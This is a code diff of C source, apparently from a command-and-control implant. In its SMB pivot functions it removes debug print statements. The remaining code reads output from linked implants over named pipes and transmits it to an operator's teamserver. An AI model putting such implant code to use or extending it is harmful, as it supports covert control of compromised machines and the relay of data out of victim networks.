@@ -25,7 +25,7 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
     {
         if ( ! Instance->Win32.WaitNamedPipeA( NamedPipe, 5000 ) )
         {
-            PUTS( "Could not open pipe: 5 second wait timed out." );
+
             return FALSE;
         }
     }
@@ -61,7 +61,6 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
         }
     } while ( TRUE );
 
-    PUTS( "Adding pivot data to the list" )
     // Adding data to the list
     {
         PRINTF( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )
@@ -78,7 +77,6 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
         }
         else
         {
-            PUTS( "Else" )
             PPIVOT_DATA PivotList = Instance->SmbPivots;
 
             do
@@ -94,11 +92,7 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
                         break;
                     }
                 }
-                else
-                {
-                    PUTS( "break" )
-                    break;
-                }
+                else break;
             } while ( TRUE );
         }
     }
@@ -143,29 +137,19 @@ VOID PivotCollectOutput()
 
                             if ( Instance->Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
                             {
-                                PRINTF( "Output Length:[%d] BytesSize:[%d]\n", Length, BytesSize )
-                                PRINT_HEX( Output, BytesSize )
-
                                 Package = PackageCreate( DEMON_COMMAND_PIVOT );
                                 PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
                                 PackageAddBytes( Package, Output, BytesSize );
 
-                                PUTS( "Send data to the teamserver." )
                                 PackageTransmit( Package, NULL, NULL );
                             }
-                            else
-                            {
-                                PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
-                            }
+                            else PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
 
                             MemSet( Output, 0, Length );
                             Instance->Win32.LocalFree( Output );
                             Output = NULL;
                         }
-                    } else {
-                        PUTS( "No more data to read." )
-                        break;
-                    }
+                    } else break;
                 }
                 else
                 {
@@ -173,7 +157,6 @@ VOID PivotCollectOutput()
 
                     if ( NtGetLastError() == ERROR_BROKEN_PIPE )
                     {
-                        PUTS( "ERROR_BROKEN_PIPE :: Pivot disconnected" )
                         TempList->Handle = NULL;
 
                         // Sends already read data.
